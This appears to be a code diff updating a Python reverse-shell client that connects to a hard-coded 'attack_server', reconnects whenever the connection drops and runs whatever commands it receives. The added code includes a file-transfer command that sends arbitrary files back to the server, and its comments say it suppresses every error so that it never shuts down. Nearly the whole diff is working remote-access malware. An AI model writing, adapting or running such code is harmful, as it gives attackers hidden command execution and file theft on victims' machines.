@@ -34,33 +34,38 @@ port = 9001 #port of attack_server
 host_addr = "127.0.0.1" 
 debug_print("client start...")
 
+
 while True:
     try:
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.connect((host_addr, port))
-            debug_print("connected to",host_addr,port)
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+            sock.connect((host_addr, port))
+            debug_print(f"connected to {host_addr},{port}")
             while True:
                 debug_print("wait for server message...")
-                data = s.recv(10000).decode()
-                debug_print(f"server sended : {data}")
-                if(data[:2]=="cd"):
-                    try:
-                        os.chdir(str(data[3:]))
-                        output=os.getcwd()
-                    except Exception as e:
-                        output=str(e)
+                server_cmd = sock.recv(10000).decode()  # recv server command
+                debug_print(f"server sended : {server_cmd}")
+                if(server_cmd[:2]=="cd"):
+                    os.chdir(str(server_cmd[3:]))
+                    output=os.getcwd()
+                if(server_cmd[:2]=="ft"):
+                    debug_print("file transfer command recved...")
+                    file_path = os.path.join(os.getcwd(),server_cmd[3:])
+                    print(file_path)
+                    with open(file_path,'rb') as f:
+                        file_content = f.read()
+                        file_name = file_path.split('/')[-1]
+                        file_size = len(file_content)
+                        sock.sendall(f'{file_name} {file_size}'.encode())
+                        sock.sendall(file_content)
                 else:
-                    output=subprocess.getoutput(data)
+                    output=subprocess.getoutput(server_cmd)
                 debug_print(f"output: /{output}/")
                 if(output==''): #빈 버퍼를 보내면 상대가 받지못한다. 그러면 무한 교착상태 발생
-                    s.send("null...".encode())
-                s.send(output.encode())
+                    sock.send("null...".encode())
+                sock.send(output.encode()) # send terminal output to server
                 debug_print("sended!")
                 
-
-    except(ConnectionRefusedError,ConnectionResetError):
-        debug_print('Connection lost... Retrying in 5 seconds')
-        time.sleep(1)
-    except:
+    except Exception as e:
+        debug_print(e)
         pass #네트워크 에러면 재시도하고, 다른 모든 에러는 모두 pass해서 절대 꺼지지않도록 함.
         
